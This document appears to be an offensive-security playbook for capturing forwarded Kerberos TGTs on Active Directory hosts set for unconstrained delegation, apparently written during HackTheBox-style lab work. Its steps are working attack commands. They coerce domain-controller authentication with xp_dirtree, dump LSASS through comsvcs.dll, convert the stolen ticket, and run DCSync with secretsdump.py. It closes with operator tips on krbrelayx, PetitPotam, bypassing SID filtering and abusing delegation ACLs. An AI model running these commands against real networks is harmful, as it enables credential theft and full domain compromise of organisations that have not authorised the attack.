# Unconstrained Delegation TGT Capture

## When this applies

- AD environment with a host configured for unconstrained delegation (default for all DCs; non-DC hosts with `TRUSTED_FOR_DELEGATION` UAC flag).
- You have SYSTEM on that host (or the ability to coerce a privileged account to authenticate to it).
- Goal: capture the forwarded TGT of a privileged caller (DC$, Administrator, etc.) and reuse it for DCSync or other privileged actions.

## Technique

When a Kerberos client authenticates to a host trusted for unconstrained delegation, the client's TGT is forwarded and cached in LSASS on the receiving host. Extract the cached TGT, convert to ccache, and reuse.

## Steps

```bash
# All DCs have unconstrained delegation. If you have SYSTEM on a DC in a trusted forest,
# coerce the target DC's machine account to authenticate via Kerberos → TGT is forwarded.
#
# Step 1: Trigger coercion from target DC's MSSQL (if you have any MSSQL access)
EXEC xp_dirtree '\\DC02.otherdomain.ext\SYSVOL\', 1, 1
# The MSSQL service (running as DC01$) authenticates via Kerberos to DC02
# DC02 (unconstrained delegation) caches DC01$'s forwarded TGT in LSASS
#
# Step 2: On DC02 (as SYSTEM), extract the TGT
# Option A: Compile C# ticket extractor using LsaEnumerateLogonSessions + LsaCallAuthenticationPackage
# Option B: Dump LSASS with comsvcs.dll MiniDump, analyze offline with pypykatz
klist sessions   # Find the DC01$ session LUID
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\l.dmp full
#
# Step 3: Use DC01$'s TGT to DCSync the target domain
ticketConverter.py dc01.kirbi dc01.ccache
KRB5CCNAME=dc01.ccache secretsdump.py -k -no-pass -target-ip <DC01_IP> <domain>/DC01\$@DC01.<domain>
# DC machine accounts have full replication (DCSync) rights by default
```

## Verifying success

- `klist sessions` (or pypykatz output) shows a `krbtgt/DOMAIN` ticket cached for the impersonated principal.
- `secretsdump.py -k -no-pass <target>` succeeds against the trusting domain.

## Common pitfalls

- Cross-Forest Trust SID Filtering: `SIDFilteringQuarantined=False` does NOT mean all SID injection works. Forest trusts ALWAYS filter well-known SIDs (EA-519, DA-512, SA-518) from other forests. `TREAT_AS_EXTERNAL` (0x40) trust attribute still filters EA/DA/SA RIDs. The ONLY way to bypass forest trust SID filtering:
  1. Unconstrained delegation TGT capture (extract actual DC$ TGT, not forged) — this technique
  2. Compromise the trust key + find a path that doesn't need SID injection
  3. ADCS cross-forest enrollment (if templates allow cross-forest enrollment)
  Golden ticket + SID history across forest trusts = BLOCKED unless BOTH forests are compromised.
- Coercion requires the receiving host to authenticate via Kerberos (not NTLM) — verify the SPN is registered.
- **krbrelayx silent-exit on `docker run -d`**: when running krbrelayx in a Docker container with `docker run -d ... krbrelayx ...`, the listener binds for an instant then **exits with code 0 immediately after the startup banner**. PetitPotam's coerced auth lands on a closed port and the operator misattributes the failure to OS-level port-binding restrictions or imagined Windows hardening. Use `docker run -d -i ...` (the `-i` keeps stdin attached and prevents Python from receiving SIGHUP/EOF on detach) or `docker run -d --restart=always ... tail -f /dev/null & krbrelayx ...`. Verify with `docker logs <container>` and `nc -zv 127.0.0.1 445` BEFORE triggering coercion.
- **macOS Docker Desktop privileged ports — INBOUND only**: Docker Desktop binds 0.0.0.0:445 + 0.0.0.0:80 on macOS without sudo via its userland networking proxy, and traffic from VPN-routed targets reaches the container — so the krbrelayx + PetitPotam chain DOES work from a macOS attacker host. The constraint is Docker tooling correctness, not OS policy. Confirm with `docker run -d -p 445:445 -p 80:80 --rm -i busybox nc -lkvp 445`. **However, OUTBOUND source ports are NAT-rewritten** by Docker Desktop's vpnkit (and Lima's slirp) — privileged-source-port binding inside the container/VM is NOT preserved on egress. NFS exports that enforce `secure` (RFC requirement: client source port <1024), Cisco-style "trusted-port" ACLs, and any service relying on a privileged client source port are unreachable from macOS Docker without an L2-bridged solution (socket_vmnet on Lima with `network: lima`, sudo `pf rdr`, or a Linux jumphost on the VPN).
- **Machine accounts don't survive HTB machine respawn**: a fake computer (e.g. `ATTACK$`) created via MachineAccountQuota during one engagement run is GONE after the platform respawns the box; SMB still answers `(GUEST)` to the old NT hash, masking the deletion. Always re-add the computer at the start of each run.
- **`krbrelayx -l <lootdir>` is silently ignored**: ccache files always save to the krbrelayx cwd inside the container — use `docker cp <container>:/path *.ccache .` to extract.
- **`coercer.py 2.4.3 --always-continue` hangs** on interactive `NO_AUTH_RECEIVED` prompts; use stand-alone `PetitPotam.py` for one-shot coercion.
- **`SeEnableDelegationPrivilege` is NOT a write to `msDS-AllowedToDelegateTo`.** It only authorizes setting the `TRUSTED_FOR_DELEGATION` UAC bit on accounts you can already write — constrained delegation requires a separate ACL on `Account-Restrictions` or higher. Furthermore, **Server 2022 enforces `SeEnableDelegationPrivilege` server-side at the LDAP-modify gate** — holding the privilege via group membership and running locally on the DC (WinRM/PowerShell) does NOT bypass the check; the DC validates the *requesting* security context. The privilege is only useful when the holding principal also has the LDAP write ACE on the target attribute.
- **Property-set ACL nuance for delegation attributes:**
  - `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) lives in the **`Account-Restrictions`** property set (GUID `4c164200-20c0-11d0-a768-00aa006e0529`). A `WriteAccountRestrictions` ACE on the target lets you set RBCD without `GenericWrite`.
  - `msDS-AllowedToDelegateTo` (constrained delegation) lives in the **`Public-Information`** property set (GUID `e48d0154-bcf8-11d1-8702-00c04fb96050`). Public-Information is read-only by default for non-admin principals — write access requires `GenericWrite`, `WriteDACL`, or explicit ACE on the attribute itself.
  - When BloodHound shows GenericAll on an OU but no direct write to the child's `msDS-AllowedToDelegateTo`, dsacls or the equivalent LDAP modify will reject — propagation does not auto-cover the Public-Information set.

## Tools

- mimikatz (`sekurlsa::tickets /export`)
- pypykatz
- comsvcs.dll MiniDump
- impacket `ticketConverter.py`, `secretsdump.py`
- Coercer / PetitPotam (for triggering authentication)
